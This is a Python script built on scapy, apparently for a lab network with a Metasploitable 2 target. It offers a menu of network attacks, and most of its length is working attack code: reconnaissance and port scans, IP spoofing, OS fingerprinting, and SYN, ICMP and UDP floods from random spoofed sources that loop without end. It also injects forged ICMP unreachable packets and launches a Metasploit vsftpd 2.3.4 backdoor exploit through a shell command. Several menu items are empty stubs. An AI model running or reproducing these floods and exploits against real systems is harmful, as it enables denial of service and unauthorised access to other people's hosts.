from scapy.all import *
from scapy.layers.inet import IP, UDP, TCP, ICMP
import ftplib


def attack_to_perform(number):
    switch = {
        1: perform_reconnaissance_TCP_ACK,  # first recon attack
        2: perform_reconnaissance_UDP_SCAN,  # second recon attack
        3: perform_dos,  # first dos attack
        4: perform_dos,  # second dos attack
        5: perform_dos,  # third dos attack
        6: perform_ftp_attack,  # ftp attack (ok?)
        7: perform_sweep,  # ip address sweep (ok)
        8: perform_port_scan_TCP,  # port scan (ok)
        9: perform_ip_spoofing,  # ip spoofing (ok)
        10: perform_os_discovery,  # os discovery (ok)
        11: perform_syn_flood_attack,  # syn flood attack (?)
        12: perform_icmp_flood_attack,  # icmp flood attack (?)
        13: perform_udp_flood_attack,  # udp flood attack (?)
        14: perform_drop_communication,  # drop communication (not working)
        15: perform_arp_poisoning,  # arp poisoning (to implement)
        16: perform_special_attack,  # special attack
    }

    if number in switch:
        return switch[number]()
    else:
        return "Number out of range"


def print_attack_menu():
    print("Standard Attacks: -----------------------------------")
    print("(1) Reconnaissance: TCP ACK FLAG Scan on network 192.168.200.x ")
    print("(2) Reconnaissance: UDP Scan on network 192.168.200.x")
    print("(3) Denial of Service Attack on network 192...")
    print("(4) Denial of Service Attack on network 192...")
    print("(5) Denial of Service Attack on network 192...")
    print("(6) FTP Attack on Metasploitable 2")
    print("Custom Attacks: -------------------------------------")
    print("(7) IP Address Sweep")
    print("(8) Port Scan")
    print("(9) IP Spoofing")
    print("(10) Discover OS of Target")
    print("(11) SYN Flood Attack")
    print("(12) ICMP Flood Attack")
    print("(13) UDP Flood Attack")
    print("(14) Drop Communication")
    print("(15) ARP Poisoning")
    print("(16) Special Attack")
    print("-----------------------------------------------------")
    print()


# write a function for each attack in the print_attack_menu
# each function should return a string describing the attack
# the function should take any required input from the user
# and should call any other functions that are required to
# perform the attack


# (1) Code to perform reconnaissance TCP ACK FLAG Scan
def perform_reconnaissance_TCP_ACK(ip_addr="192.168.200."):
    print("Searching for live hosts on the network...")

    live_hosts = perform_sweep(packet_dst=ip_addr, start=34 , end=56)

    # Prompt the user to choose a host by typing a number
    selected_host = None
    while not selected_host:
        try:
            # Display the list of live hosts with corresponding numbers
            for i, host in enumerate(live_hosts):
                print(f"{i+1}: {host}")

            choice = input("Enter the number of the host you want to select: ")
            choice = int(choice)

            if 1 <= choice <= len(live_hosts):
                selected_host = live_hosts[choice - 1]
            else:
                print("Invalid choice. Please enter a valid number.")
        except ValueError:
            print("Invalid input. Please enter a valid number.")

    # Print the selected host
    print("Selected host: ", selected_host)

    # Ask the destination port
    dst_port = None
    while not dst_port:
        try:
            dst_port = input("Enter the destination port: ")
            dst_port = int(dst_port)

            if not 1 <= dst_port <= 65535:
                print("Invalid port. Please enter a valid port number.")
                dst_port = None
        except ValueError:
            print("Invalid input. Please enter a valid number.")

    dst_ip = selected_host

    # Perform the TCP ACK scan
    print("Performing TCP ACK scan on ", dst_ip, " port ", dst_port, " ...")

    # Create the packet
    # packet = IP(dst=selected_host) / TCP(flags="A", dport=80)

    # Send the packet and get the response
    # response = sr1(packet, timeout=1, verbose=0)

    response = sr1(
        IP(dst=dst_ip) / TCP(dport=dst_port, flags="A"), timeout=10, verbose=False
    )

    if response is None:
        return "Stateful firewall present (Filtered)"
    elif response.haslayer(TCP):
        if response.getlayer(TCP).flags == 0x4:  # RST flag
            return "No firewall (Unfiltered)"
    elif response.haslayer(ICMP):
        if int(response.getlayer(ICMP).type) == 3 and int(
            response.getlayer(ICMP).code
        ) in [1, 2, 3, 9, 10, 13]:
            return "Stateful firewall present (Filtered)"

    """
    # Check the response for different scenarios
    if response is None:
        return "Port is filtered. Stateful firewall is present."
    elif response.haslayer(TCP):
        return "Port is unfiltered. Stateful firewall is absent."
    elif response.haslayer(ICMP):
        if int(response.getlayer(ICMP).type) == 3 and int(
            response.getlayer(ICMP).code
        ) in [1, 2, 3, 9, 10, 13]:
            return "Port is filtered. Stateful firewall is present."
    else:
        return "Unexpected response. Unable to determine the state of the port."
    """


# (2) Code to perform reconnaissance UDP SCAN
def perform_reconnaissance_UDP_SCAN(ip_addr="192.168.200."):
    print("Searching for live hosts on the network...")

    live_hosts = perform_sweep(packet_dst=ip_addr, start=34 , end=56)

    # Prompt the user to choose a host by typing a number
    selected_host = None
    while not selected_host:
        try:
            # Display the list of live hosts with corresponding numbers
            for i, host in enumerate(live_hosts):
                print(f"{i+1}: {host}")

            choice = input("Enter the number of the host you want to select: ")
            choice = int(choice)

            if 1 <= choice <= len(live_hosts):
                selected_host = live_hosts[choice - 1]
            else:
                print("Invalid choice. Please enter a valid number.")
        except ValueError:
            print("Invalid input. Please enter a valid number.")

    # Print the selected host
    print("Selected host: ", selected_host)

    # Ask the destination port
    dst_port = None
    while not dst_port:
        try:
            dst_port = input("Enter the destination port: ")
            dst_port = int(dst_port)

            if not 1 <= dst_port <= 65535:
                print("Invalid port. Please enter a valid port number.")
                dst_port = None
        except ValueError:
            print("Invalid input. Please enter a valid number.")

    dst_ip = selected_host
    dst_timeout = 10

    # Perform the UDP scan
    print("Performing UDP scan on ", dst_ip, " port ", dst_port, " ...")

    return (
        "Port "
        + str(dst_port)
        + " on "
        + selected_host
        + " is "
        + udp_scan(dst_ip, dst_port, dst_timeout)
    )


def udp_scan(dst_ip, dst_port, dst_timeout):
    udp_scan_resp = sr1(IP(dst=dst_ip) / UDP(dport=dst_port), timeout=dst_timeout)

    if udp_scan_resp is None:
        retrans = []
        for count in range(0, 3):
            retrans.append(
                sr1(IP(dst=dst_ip) / UDP(dport=dst_port), timeout=dst_timeout)
            )

        for item in retrans:
            if item is not None:
                udp_scan(dst_ip, dst_port, dst_timeout)

        return "Open|Filtered"

    elif udp_scan_resp.haslayer(UDP):
        return "Open"

    elif udp_scan_resp.haslayer(ICMP):
        icmp_type = int(udp_scan_resp.getlayer(ICMP).type)
        icmp_code = int(udp_scan_resp.getlayer(ICMP).code)

        if icmp_type == 3 and icmp_code == 3:
            return "Closed"

        elif icmp_type == 3 and icmp_code in [1, 2, 9, 10, 13]:
            return "Filtered"


# Code to perform dos attack
def perform_dos(ip_addr=None):
    if not ip_addr:
        # Get input from the user
        ip_addr = input("Enter the IP address to Dos: ")

    return "Dos performed on " + ip_addr


# (6) Code to perform ftp attack
def perform_ftp_attack():
    ip_addr = "192.168.200.55"

    print("Exploiting the vsftpd 2.3.4 backdoor vulnerability... ")

    metasploit_command = f"msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {ip_addr}; set PAYLOAD cmd/unix/interact; run'"

    try:
        # Execute the Metasploit command using subprocess
        subprocess.run(metasploit_command, shell=True, check=True)
        return "Exploit executed successfully."
    except subprocess.CalledProcessError as e:
        return f"An error occurred: {str(e)}"


# (7) Code to perform ip address sweep
def perform_sweep(packet_dst=None, start=1, end=255, packet_data=""):
    flag = False

    if not packet_dst:
        # Get input from the user
        packet_dst = input("Enter the destination IP: ")
        packet_data = input("Enter the packet data: ")
        flag = True

    live_hosts = []
    ip_range = [packet_dst + str(i) for i in range(start, end)]

    for ip in ip_range:
        packet = IP(dst=ip) / ICMP() / packet_data
        reply = sr1(packet, timeout=0.1, verbose=0)
        if reply is not None and ICMP in reply:
            live_hosts.append(ip)

    print("Live hosts: ", live_hosts)

    if not flag:
        return live_hosts

    return "Sweep towards " + packet_dst + " performed"


# (8) Code to perform port scan
def perform_port_scan_TCP(ip_addr=None, port_range=None):
    if not ip_addr:
        # Get input from the user
        ip_addr = input("Enter the IP address to scan: ")

    if not port_range:
        # Get input from the user
        port_range = input("Enter the port range to scan (e.g. 1-1000): ")

    # split the port range into two numbers
    port_range = port_range.split("-")
    # convert the port numbers to integers
    port_start = int(port_range[0])
    port_end = int(port_range[1])
    # create a list of ports to scan
    ports = range(port_start, port_end + 1)

    print(
        "Scanning "
        + ip_addr
        + " for open TCP ports in range ("
        + str(port_start)
        + " - "
        + str(port_end)
        + ")."
    )

    # create a list of open ports
    open_ports = []
    try:
        # scan the ports
        for port in ports:
            # create a TCP packet
            tcp_packet = IP(dst=ip_addr) / TCP(dport=port, flags="S")
            # send the packet and wait for a response
            tcp_response = sr1(tcp_packet, timeout=0.5, verbose=0)
            # if a response was received
            if tcp_response:
                # if the response is a SYN-ACK
                if tcp_response[TCP].flags == "SA":
                    # add the port to the list of open ports
                    open_ports.append(port)
            sr(
                IP(dst=ip_addr) / TCP(dport=tcp_response.sport, flags="R"),
                timeout=0.5,
                verbose=0,
            )
    except AttributeError:
        pass

    # print the open ports
    for port in open_ports:
        print("Port" + str(port) + " is open!")

    return "Port scan performed successfully on " + ip_addr


# (9) Code to perform ip spoofing
def perform_ip_spoofing(src_ip=None, dst_ip=None, packet_data=None):
    if not src_ip:
        # Get input from the user
        src_ip = input("Enter the source IP address: ")

    if not dst_ip:
        # Get input from the user
        dst_ip = input("Enter the destination IP address: ")

    if not packet_data:
        # Get input from the user
        packet_data = input("Enter the packet data: ")

    packet = IP(src=src_ip, dst=dst_ip) / packet_data

    packet_counter = 0

    # Continuously send the packet until the user decides to stop
    while True:
        packet_counter += 1
        send(packet)
        user_input = input("Press Enter to send another packet or 'q' to quit: ")
        if user_input.lower() == "q":
            break

    return "IP spoofing performed from {} to {} with data {}. Total packets sent: {}".format(
        src_ip, dst_ip, packet_data, packet_counter
    )


# (10) Code to perform os discovery
def perform_os_discovery(ip_addr=None):
    if not ip_addr:
        # Get input from the user
        ip_addr = input("Enter the IP address to scan: ")

    # Send TCP packet with no flags set
    packet = IP(dst=ip_addr) / TCP()
    response = sr1(packet, timeout=1, verbose=0)

    os_result = "Unknown OS"

    if response:
        os_result = os_fingerprint(response)

    return "OS discovery performed on {}. Detected OS: {}".format(ip_addr, os_result)


# Determine the OS based on the response packet TTL value
def os_fingerprint(packet):
    if packet.haslayer(IP):
        ip_ttl = packet[IP].ttl

        # Assuming Linux-based OSes have a TTL value of 64
        if ip_ttl == 64:
            return "Linux-based OS"

        # Assuming Windows-based OSes have a TTL value of 128
        elif ip_ttl == 128:
            return "Windows-based OS"

    # Fallback option if packet analysis does not provide OS information
    return "No OS information available"


# (11) Code to perform syn flood attack
def perform_syn_flood_attack(ip_addr=None, port="139"):
    if not ip_addr:
        # Get input from the user
        ip_addr = input("Enter the IP address to attack: ")

    packet = IP(src=RandIP(), dst=ip_addr) / TCP(dport=int(port), flags="S")

    send(packet, inter=0.00005, loop=1, verbose=0)

    return "SYN flood attack performed on " + ip_addr + " to port " + port


# (12) Code to perform icmp flood attack
def perform_icmp_flood_attack(ip_addr=None):
    if not ip_addr:
        # Get input from the user
        ip_addr = input("Enter the IP address to attack: ")

    packet = IP(src=RandIP(), dst=ip_addr) / ICMP() / "1234567890"

    send(packet, inter=0.005, loop=1, verbose=0)

    return "ICMP flood attack performed on " + ip_addr


# (13) Code to perform udp flood attack
def perform_udp_flood_attack(ip_addr=None, port=None):
    if not ip_addr:
        # Get input from the user
        ip_addr = input("Enter the IP address to scan: ")

    if not port:
        # Get input from the user
        port = input("Enter the port to attack: ")

    packet = IP(src=RandIP(), dst=ip_addr) / UDP(dport=int(port)) / ("X" * RandByte())

    send(packet, inter=0.005, loop=1, verbose=0)

    return "UDP flood attack performed on " + ip_addr + " to port " + port


# (14) Code to perform drop communication
def perform_drop_communication(ip_addr=None):
    if not ip_addr:
        # Get input from the user
        ip_addr = input("Enter the IP address to attack: ")

    # Create a packet filter to capture packets from the specified IP address
    filter_str = "ip src {}".format(ip_addr)

    # Sniff packets and execute RST attack
    def packet_handler(packet):
        if packet.haslayer(ICMP):
            if packet[IP].src == ip_addr:
                # Create an ICMP Destination Unreachable packet to drop the communication
                drop_packet = ICMP(type=3, code=1)

                # Send the ICMP Destination Unreachable packet
                send(
                    IP(src=packet[IP].src, dst=packet[IP].dst) / drop_packet, verbose=0
                )
                send(
                    IP(src=packet[IP].dst, dst=packet[IP].src) / drop_packet, verbose=0
                )

                # Print the dropped communication
                print(
                    "Dropped communication: Source IP: {}, Destination IP: {}, ICMP Type: {}, ICMP Code: {}".format(
                        packet[IP].src,
                        packet[IP].dst,
                        packet[ICMP].type,
                        packet[ICMP].code,
                    )
                )

    # Start sniffing packets and call the packet_handler for each captured packet
    print("Start sniffing...")
    sniff(filter=filter_str, prn=packet_handler)

    return "Drop communication performed on IP address: {}".format(ip_addr)


# (15) Code to perform ARP poisoning
def perform_arp_poisoning(ip_addr=None):
    if not ip_addr:
        # Get input from the user
        ip_addr = input("Enter the IP address to scan: ")

    return "ARP poisoning performed on " + ip_addr


# (16) Code to perform Special attack
def perform_special_attack(ip_addr=None):
    if not ip_addr:
        # Get input from the user
        ip_addr = input("Enter the IP address to scan: ")

    return "Special attack performed on " + ip_addr


def main():
    # Print attack menu
    print_attack_menu()

    # Get input from the user
    while True:
        try:
            number = int(input("Select an attack: "))
            break  # Exit the loop if a valid number is entered
        except ValueError:
            print("Invalid input. Please enter a valid number.")

    # Select the attack type
    atk = attack_to_perform(number)

    # Print the result
    print()
    print(atk)
    print()


if __name__ == "__main__":
    # Initial execution
    redo = ""

    # Redo loop
    while redo.lower() != "n":
        main()
        redo = input("Do you want to perform another attack? (y/n): ")
        print()
